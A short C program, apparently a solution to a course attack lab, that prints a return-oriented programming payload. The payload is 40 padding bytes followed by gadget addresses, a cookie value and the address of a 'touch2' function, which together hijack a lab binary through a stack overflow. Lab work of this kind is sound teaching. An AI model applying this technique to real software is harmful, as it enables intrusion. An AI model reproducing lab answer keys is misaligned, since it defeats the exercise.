#include<stdio.h>
#include<string.h>

void input_string(char* dest, const char* src, int* p_i)
{
	strcpy(dest + *p_i, src);
	*p_i += strlen(src);
	return;
}

int main()
{
	char print[300];
	int index = 0;

	while(index < 120) 
	{
		input_string(print, "00 ", &index);
	}
	// 4019cc: pop %rax
	input_string(print, "cc 19 40 00 00 00 00 00 ", &index); 
	
	// (cookie)
	input_string(print, "fa 97 b9 59 00 00 00 00 ", &index);
	
	// 4019c6: movl %rax, %rdi
	input_string(print, "c6 19 40 00 00 00 00 00 ", &index);
	
	// goto touch2
	input_string(print, "ec 17 40 00 00 00 00 00 ", &index);
	printf("%s", print);
	return 0;
}
